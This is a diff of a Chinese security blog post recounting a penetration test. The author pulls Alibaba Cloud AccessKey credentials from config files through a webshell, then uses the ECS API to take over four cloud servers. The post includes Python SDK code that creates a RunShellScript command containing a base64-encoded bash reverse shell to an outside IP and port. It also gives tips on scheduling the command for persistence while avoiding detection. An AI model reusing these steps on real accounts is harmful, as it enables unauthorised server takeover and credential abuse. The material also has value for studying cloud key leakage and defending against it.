@@ -1,98 +1,86 @@
-<!doctype html><html><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>阿里云Access Token问题 - 项目收获记录 - 倾旋的博客</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/normalize.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/main.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/extra.css><link id=dark-scheme rel=stylesheet type=text/css href=https://payloads.online/css/dark.css><script src=https://payloads.online/js/feather.min.js></script><script src=https://payloads.online/js/main.js></script><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&family=Inter:wght@400;500;600;700&display=swap"><link rel=stylesheet href=/css/fontawesome.css></head><body><div class="container wrapper"><div class=header><div class=avatar><a href=https://payloads.online/><img src=/avatar.jpeg alt=倾旋的博客></a></div><h1 class=site-title><a href=https://payloads.online/>倾旋的博客</a></h1><div class=site-description><p>现阶段在进行有效性验证/攻击模拟相关的安全研究工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p><nav class="nav social"><ul class=flat><li><a href=https://github.com/rvn0xsy/ title=Github><i data-feather=github></i></a></li><li><a href=/index.xml title=RSS><i data-feather=rss></i></a></li><li><a href=/ title=Wechat><i data-feather=message-circle></i></a></li><span class=scheme-toggle><a href=# id=scheme-toggle></a></ul></nav></div><nav class=nav><ul class=flat><li><a href=/>首页</a></li><li><a href=/posts/>文章列表</a></li><li><a href=/tags>标签</a></li><li><a href=/projects>开源项目</a></li><li><a href=/about>关于我</a></li><li><a href=/links/>友情链接</a></li><li><a href=/message>留言</a></li><li><a href=/sponsor>赞助</a></li></ul></nav></div><div class=post><div class=post-header><div class=meta><div class=date><span class=day>02</span>
-<span class=rest>Apr 2019</span></div></div><div class=matter><h1 class=title>阿里云Access Token问题 - 项目收获记录</h1></div></div><h2 id=0x00-前言>0x00 前言</h2><p>Q：在获得权限较低的Webshell的情况下，如何继续扩大收获？</p><p>A：首先，信息搜集，分别包含：当前权限，主机网络环境、系统进程、网络连接状况、散落的凭证等，然后进行战略分析</p><ol><li>是否需要提权</li><li>如何将流量带入（转发）</li><li>结合搜集的信息转化出其他更好的思路</li></ol><p>很巧，我遇到了第三种情况。</p><p><strong>Tips：内网渗透一般提权是最不可取的方案，我们只需要不断搜集信息、撕开一个流量口子即可。</strong></p><h2 id=0x01-阿里云对象存储---oss>0x01 阿里云对象存储 - OSS</h2><p>什么是对象存储？</p><p>阿里云对象存储服务（Object Storage Service，简称OSS），是阿里云对外提供的海量、安全、低成本、高可靠的云存储服务。您可以通过本文档提供的简单的REST接口，在任何时间、任何地点、任何互联网设备上进行上传和下载数据。基于OSS，您可以搭建出各种多媒体分享网站、网盘、个人和企业数据备份等基于大规模数据的服务。</p><p>通过Webshell在目标机器（Linux）的Web站点目录下发现多个子站配置文件<code>config.php</code>，配置了同一个阿里云的OSS地址，只是存储空间（Bucket）不同。</p><p>通常情况下一个阿里云oss地址的组成如下：</p><p><code>http(s)://[BucketName].oss-cn-[Region].aliyuncs.com</code></p><p>BucketName ：存储空间</p><p>Region：地域，目前有如下几个：</p><p><img src=https://images.payloads.online/5f10d050-4f5f-11ec-b934-00d861bf4abb.png alt=2019-04-02-20-58-34></p><p>例如：杭州 = cn-hangzhou</p><h2 id=0x02-access-token>0x02 Access Token</h2><p>Access Token = AccessKeyId + AccessKeySecret</p><p>OSS通过使用AccessKeyId/ AccessKeySecret对称加密的方法来验证某个请求的发送者身份。</p><p>AccessKeyId用于标示用户，AccessKeySecret是用户用于加密签名字符串和OSS用来验证签名字符串的密钥，其中AccessKeySecret必须保密，只有用户和OSS知道。AccessKey 根据所属账号的类型有所区分。</p><p><strong>阿里云账户AccessKey：阿里云账号提供的AccessKey拥有所属资源的全部操作权限</strong></p><p>RAM账户AccessKey：RAM账户由阿里云账号授权生成，所拥有的AccessKey拥有对特定资源限定的操作权限</p><p>STS临时访问凭证：由阿里云账号或RAM账号生成，所拥有的AccessKey在限定时间内拥有对特定资源限定的操作权限。过期权限收回。</p><p><a href="https://help.aliyun.com/document_detail/31867.html?spm=a2c4g.11186623.2.7.60c35869TaDn9K#concept-e4s-mhv-tdb">详细介绍</a></p><h2 id=0x03-通过access-token接管ecs>0x03 通过Access Token接管ECS</h2><p>ECS：云服务器（Elastic Compute Service，简称 ECS）是一种简单高效、处理能力可弹性伸缩的计算服务，帮助您快速构建更稳定、安全的应用，提升运维效率，降低 IT 成本，使您更专注于核心业务创新。</p><p>前面介绍到，默认情况下，阿里云用户获得的Access Token是对当前用户所有服务通用的令牌，在没有使用RAM账户的情况下，就可以使用SDK去操作阿里云所有产品。</p><p>在此次项目里，我接管了四台ECS，执行任意命令，获得最大权限。</p><p>首先，通过读取配置文件，获得了同于上传图片所需要认证的Access Token，如何检验是否可用的呢？</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>Access Key Id : *********
-</span></span><span style=display:flex><span>Access Secret : ***************************
-</span></span><span style=display:flex><span>Region : cn-*****
-</span></span></code></pre></td></tr></table></div></div><p>下面直接调用获取ECS实例的API即可，以往情况下，我会使用Python，安装阿里云的sdk-core库，但是现在能在线调试，大大的节省了本地调试的成本：</p><p>DescribeInstances - 获得实例信息</p><p><img src=https://images.payloads.online/5f4963fc-4f5f-11ec-9a56-00d861bf4abb.png alt=2019-04-02-21-11-05></p><p>只有第一个<code>RegionId</code>是必填项，点击<code>API Explorer</code>，可以直接进入调试环境：</p><p><img src=https://images.payloads.online/5f9a2274-4f5f-11ec-8f74-00d861bf4abb.png alt=2019-04-02-21-12-38></p><p>服务器上的oss配置中刚好有RegionId，我就直接选择了，然后填入Access Token信息，就可以获得数据。</p><p>我是直接在<code>Alicloud Shell</code>里复制了一份运行的：</p><p><img src=https://images.payloads.online/5fe32866-4f5f-11ec-8225-00d861bf4abb.png alt=2019-04-02-21-16-55></p><p>输出结果如下：</p><p><img src=https://images.payloads.online/60291bd2-4f5f-11ec-88bc-00d861bf4abb.png alt=2019-04-02-21-21-17></p><p>使用<code>json.cn</code>格式化一下：</p><p><img src=https://images.payloads.online/607ec69a-4f5f-11ec-a155-00d861bf4abb.png alt=2019-04-02-21-23-48></p><p>共四台服务器，那么如何执行命令呢？</p><p>首先要创建一条命令，然后指定实例来调用命令，手册地址：</p><p><a href=https://help.aliyun.com/document_detail/64844.html>https://help.aliyun.com/document_detail/64844.html</a></p><p>命令的类型取值范围：</p><ul><li>RunBatScript：创建一个在 Windows 实例中运行的 Bat 脚本</li><li>RunPowerShellScript：创建一个在 Windows 实例中运行的 PowerShell 脚本</li><li>RunShellScript：创建一个在 Linux 实例中运行的 Shell 脚本</li></ul><p>由于都是Linux，我就选择RunShellScript，注意：命令必须是base64encode</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>rvn0xsy@Rvn0xsy ~&gt; echo &#34;bash -i &gt;&amp; /dev/tcp/1.1.1.1/2333 0&gt;&amp;1&#34; | base64
-</span></span><span style=display:flex><span>YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzIzMzMgMD4mMQo=
-</span></span></code></pre></td></tr></table></div></div><p><img src=https://images.payloads.online/60c11202-4f5f-11ec-ac1c-00d861bf4abb.png alt=2019-04-02-21-29-22></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>#!/usr/bin/env python
-</span></span><span style=display:flex><span>#coding=utf-8
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>from aliyunsdkcore.client import AcsClient
-</span></span><span style=display:flex><span>from aliyunsdkcore.acs_exception.exceptions import ClientException
-</span></span><span style=display:flex><span>from aliyunsdkcore.acs_exception.exceptions import ServerException
-</span></span><span style=display:flex><span>from aliyunsdkecs.request.v20140526.CreateCommandRequest import CreateCommandRequest
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>client = AcsClient(&#39;&lt;accessKeyId&gt;&#39;, &#39;&lt;accessSecret&gt;&#39;, &#39;cn-shanghai&#39;)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>request = CreateCommandRequest()
-</span></span><span style=display:flex><span>request.set_accept_format(&#39;json&#39;)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>request.set_Type(&#34;RunShellScript&#34;)
-</span></span><span style=display:flex><span>request.set_CommandContent(&#34;YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzIzMzMgMD4mMQo=&#34;)
-</span></span><span style=display:flex><span>request.set_Name(&#34;test&#34;)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>response = client.do_action_with_exception(request)
-</span></span><span style=display:flex><span># python2:  print(response) 
-</span></span><span style=display:flex><span>print(str(response, encoding=&#39;utf-8&#39;))
-</span></span></code></pre></td></tr></table></div></div><p>执行成功后，会返回如下信息：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>{
-</span></span><span style=display:flex><span>	&#34;RequestId&#34;: &#34;********-****-****-****-********&#34;,
-</span></span><span style=display:flex><span>	&#34;CommandId&#34;: &#34;c-0************&#34;
-</span></span><span style=display:flex><span>}
-</span></span></code></pre></td></tr></table></div></div><p>CommandId最好记下来，不然还要调用<a href="https://api.aliyun.com/find/Ecs/DescribeCommands?spm=a2c1g.8271268.10000.91.169bdf25hVPFbi">DescribeCommands</a></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>{
-</span></span><span style=display:flex><span>	&#34;PageNumber&#34;: 1,
-</span></span><span style=display:flex><span>	&#34;TotalCount&#34;: 1,
-</span></span><span style=display:flex><span>	&#34;PageSize&#34;: 10,
-</span></span><span style=display:flex><span>	&#34;RequestId&#34;: &#34;********-****-****-****-********&#34;,
-</span></span><span style=display:flex><span>	&#34;Commands&#34;: {
-</span></span><span style=display:flex><span>		&#34;Command&#34;: [
-</span></span><span style=display:flex><span>			{
-</span></span><span style=display:flex><span>				&#34;Name&#34;: &#34;test&#34;,
-</span></span><span style=display:flex><span>				&#34;Timeout&#34;: 3600,
-</span></span><span style=display:flex><span>				&#34;CommandContent&#34;: &#34;YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzIzMzMgMD4mMQo=&#34;,
-</span></span><span style=display:flex><span>				&#34;Description&#34;: &#34;&#34;,
-</span></span><span style=display:flex><span>				&#34;Type&#34;: &#34;RunShellScript&#34;,
-</span></span><span style=display:flex><span>				&#34;CommandId&#34;: &#34;c-0************&#34;,
-</span></span><span style=display:flex><span>				&#34;WorkingDir&#34;: &#34;&#34;
-</span></span><span style=display:flex><span>			}
-</span></span><span style=display:flex><span>		]
-</span></span><span style=display:flex><span>	}
-</span></span><span style=display:flex><span>}
-</span></span></code></pre></td></tr></table></div></div><p>紧接着就是<code>InvokeCommand</code>：</p><ul><li>RegionId：区域ID，例如：cn-shanghai</li><li>CommandId：命令ID</li><li>InstanceId：实例ID</li><li>Timed：命令是否为周期执行。 默认值：False</li><li>Frequency：周期任务的执行周期，两次周期任务的时间间隔不能低于10秒。当参数 Timed 的值为 True 时，参数 Frequency 为必需参数。 该参数取值遵循Cron表达式，参阅<a href="https://help.aliyun.com/document_detail/64769.html?spm=a2c4g.11186623.2.21.755e1926kBOlWA">Cron表达式</a>。</li></ul><p>默认情况下，我们不需要管后面的参数，如果你想权限维持的话，可以设置Timed为False，并且设置Frequency为定时任务计划表达式，执行的过程中，基本上不会拦截，因为Access Token的调用，一切都是白名单的。</p><p><img src=https://images.payloads.online/6109210a-4f5f-11ec-85d9-00d861bf4abb.png alt=2019-04-02-21-39-17></p><hr class=footer-separator><div class=tags></div><div class=back><a href=https://payloads.online/><span aria-hidden=true>← Back</span></a></div><div class=back></div></div><div class=post><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-theme=light_protanopia data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></div></div><div class="footer wrapper"><nav class=nav><div>2024 倾旋 All rights reserved</div></nav></div><script>feather.replace()</script></body></html>
+<!doctype html><html class="not-ready lg:text-base" style=--bg:#faf8f1 lang=zh-cn dir=ltr><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>阿里云Access Token问题 - 项目收获记录 - 倾旋的博客</title><meta name=theme-color><meta name=description content="0x00 前言
+Q：在获得权限较低的Webshell的情况下，如何继续扩大收获？
+A：首先，信息搜集，分别包含：当前权限，主机网络环境、系统进程、网络连接状况、散落的凭证等，然后进行战略分析
+
+是否需要提权
+如何将流量带入（转发）
+结合搜集的信息转化出其他更好的思路
+
+很巧，我遇到了第三种情况。
+Tips：内网渗透一般提权是最不可取的方案，我们只需要不断搜集信息、撕开一个流量口子即可。
+0x01 阿里云对象存储 - OSS
+什么是对象存储？
+阿里云对象存储服务（Object Storage Service，简称OSS），是阿里云对外提供的海量、安全、低成本、高可靠的云存储服务。您可以通过本文档提供的简单的REST接口，在任何时间、任何地点、任何互联网设备上进行上传和下载数据。基于OSS，您可以搭建出各种多媒体分享网站、网盘、个人和企业数据备份等基于大规模数据的服务。
+通过Webshell在目标机器（Linux）的Web站点目录下发现多个子站配置文件config.php，配置了同一个阿里云的OSS地址，只是存储空间（Bucket）不同。
+通常情况下一个阿里云oss地址的组成如下：
+http(s)://[BucketName].oss-cn-[Region].aliyuncs.com
+BucketName ：存储空间
+Region：地域，目前有如下几个：
+
+例如：杭州 = cn-hangzhou
+0x02 Access Token
+Access Token = AccessKeyId + AccessKeySecret
+OSS通过使用AccessKeyId/ AccessKeySecret对称加密的方法来验证某个请求的发送者身份。
+AccessKeyId用于标示用户，AccessKeySecret是用户用于加密签名字符串和OSS用来验证签名字符串的密钥，其中AccessKeySecret必须保密，只有用户和OSS知道。AccessKey 根据所属账号的类型有所区分。
+阿里云账户AccessKey：阿里云账号提供的AccessKey拥有所属资源的全部操作权限
+RAM账户AccessKey：RAM账户由阿里云账号授权生成，所拥有的AccessKey拥有对特定资源限定的操作权限
+STS临时访问凭证：由阿里云账号或RAM账号生成，所拥有的AccessKey在限定时间内拥有对特定资源限定的操作权限。过期权限收回。
+详细介绍
+0x03 通过Access Token接管ECS
+ECS：云服务器（Elastic Compute Service，简称 ECS）是一种简单高效、处理能力可弹性伸缩的计算服务，帮助您快速构建更稳定、安全的应用，提升运维效率，降低 IT 成本，使您更专注于核心业务创新。
+前面介绍到，默认情况下，阿里云用户获得的Access Token是对当前用户所有服务通用的令牌，在没有使用RAM账户的情况下，就可以使用SDK去操作阿里云所有产品。
+在此次项目里，我接管了四台ECS，执行任意命令，获得最大权限。
+首先，通过读取配置文件，获得了同于上传图片所需要认证的Access Token，如何检验是否可用的呢？
+Access Key Id : *********
+Access Secret : ***************************
+Region : cn-*****
+下面直接调用获取ECS实例的API即可，以往情况下，我会使用Python，安装阿里云的sdk-core库，但是现在能在线调试，大大的节省了本地调试的成本："><meta name=author content="倾旋的博客"><link rel="preload stylesheet" as=style href=https://payloads.online/main.min.css><link rel=preload as=image href=https://payloads.online/theme.png><link rel=preload as=image href=/avatar.jpeg><script defer src=https://payloads.online/highlight.min.js onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://payloads.online/favicon.ico><link rel=apple-touch-icon href=https://payloads.online/apple-touch-icon.png><meta name=generator content="Hugo 0.148.2"><meta itemprop=name content="阿里云Access Token问题 - 项目收获记录"><meta itemprop=description content="项目中准备开展内网渗透的时候，信息搜集给我带来的收获……"><meta itemprop=datePublished content="2019-04-02T00:00:00+00:00"><meta itemprop=dateModified content="2019-04-02T00:00:00+00:00"><meta itemprop=wordCount content="207"><meta property="og:url" content="https://payloads.online/archivers/2019-04-02/1/"><meta property="og:site_name" content="倾旋的博客"><meta property="og:title" content="阿里云Access Token问题 - 项目收获记录"><meta property="og:description" content="项目中准备开展内网渗透的时候，信息搜集给我带来的收获……"><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2019-04-02T00:00:00+00:00"><meta property="article:modified_time" content="2019-04-02T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="阿里云Access Token问题 - 项目收获记录"><meta name=twitter:description content="项目中准备开展内网渗透的时候，信息搜集给我带来的收获……"><link rel=canonical href=https://payloads.online/archivers/2019-04-02/1/></head><body class="bg-(--bg) text-black antialiased duration-200 ease-out [-webkit-tap-highlight-color:transparent] dark:text-white"><header class="mx-auto flex h-[4.5rem] max-w-(--w) px-8 whitespace-nowrap lg:justify-center"><div class="relative z-50 flex items-center ltr:mr-auto rtl:ml-auto"><a class="-translate-y-[1px] text-2xl font-medium" href=https://payloads.online/>倾旋的博客</a><div class="btn-dark text-[0px] ltr:ml-4 rtl:mr-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]" role=button aria-label=Dark></div></div><div class="btn-menu relative z-50 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden ltr:-mr-8 rtl:-ml-8" role=button aria-label=Menu></div><script>const htmlClass=document.documentElement.classList;setTimeout(()=>{htmlClass.remove("not-ready")},10);const btnMenu=document.querySelector(".btn-menu");btnMenu.addEventListener("click",()=>{htmlClass.toggle("open")});const metaTheme=document.querySelector('meta[name="theme-color"]'),lightBg="#faf8f1".replace(/"/g,""),setDark=e=>{metaTheme.setAttribute("content",e?"#000":lightBg),htmlClass[e?"add":"remove"]("dark"),localStorage.setItem("dark",e)},darkScheme=window.matchMedia("(prefers-color-scheme: dark)");if(htmlClass.contains("dark"))setDark(!0);else{const e=localStorage.getItem("dark");setDark(e?e==="true":darkScheme.matches)}darkScheme.addEventListener("change",e=>{setDark(e.matches)});const btnDark=document.querySelector(".btn-dark");btnDark.addEventListener("click",()=>{setDark(localStorage.getItem("dark")!=="true")})</script><div class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full flex-col justify-center bg-(--bg) pb-16 duration-200 select-none lg:static lg:h-auto lg:flex-row lg:bg-transparent! lg:pb-0 lg:transition-none"><nav class="lg:ml-12 lg:flex lg:flex-row lg:items-center lg:space-x-10 rtl:space-x-reverse"><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/>首页</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/posts/>文章列表</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/tags>标签</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/projects>开源项目</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/about>关于我</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/links/>友情链接</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/message>留言</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/sponsor>赞助</a></nav></div></header><main class="prose prose-neutral dark:prose-invert relative mx-auto min-h-[calc(100vh-9rem)] max-w-(--w) px-8 pt-14 pb-16"><article><header class=mb-14><h1 class="my-0! pb-2.5">阿里云Access Token问题 - 项目收获记录</h1><div class="text-xs antialiased opacity-60"><time>Apr 2, 2019</time><span class=mx-1>&#183;</span>
+<span>倾旋</span></div></header><section><h2 id=0x00-前言>0x00 前言</h2><p>Q：在获得权限较低的Webshell的情况下，如何继续扩大收获？</p><p>A：首先，信息搜集，分别包含：当前权限，主机网络环境、系统进程、网络连接状况、散落的凭证等，然后进行战略分析</p><ol><li>是否需要提权</li><li>如何将流量带入（转发）</li><li>结合搜集的信息转化出其他更好的思路</li></ol><p>很巧，我遇到了第三种情况。</p><p><strong>Tips：内网渗透一般提权是最不可取的方案，我们只需要不断搜集信息、撕开一个流量口子即可。</strong></p><h2 id=0x01-阿里云对象存储---oss>0x01 阿里云对象存储 - OSS</h2><p>什么是对象存储？</p><p>阿里云对象存储服务（Object Storage Service，简称OSS），是阿里云对外提供的海量、安全、低成本、高可靠的云存储服务。您可以通过本文档提供的简单的REST接口，在任何时间、任何地点、任何互联网设备上进行上传和下载数据。基于OSS，您可以搭建出各种多媒体分享网站、网盘、个人和企业数据备份等基于大规模数据的服务。</p><p>通过Webshell在目标机器（Linux）的Web站点目录下发现多个子站配置文件<code>config.php</code>，配置了同一个阿里云的OSS地址，只是存储空间（Bucket）不同。</p><p>通常情况下一个阿里云oss地址的组成如下：</p><p><code>http(s)://[BucketName].oss-cn-[Region].aliyuncs.com</code></p><p>BucketName ：存储空间</p><p>Region：地域，目前有如下几个：</p><p><img src=https://images.payloads.online/5f10d050-4f5f-11ec-b934-00d861bf4abb.png alt=2019-04-02-20-58-34></p><p>例如：杭州 = cn-hangzhou</p><h2 id=0x02-access-token>0x02 Access Token</h2><p>Access Token = AccessKeyId + AccessKeySecret</p><p>OSS通过使用AccessKeyId/ 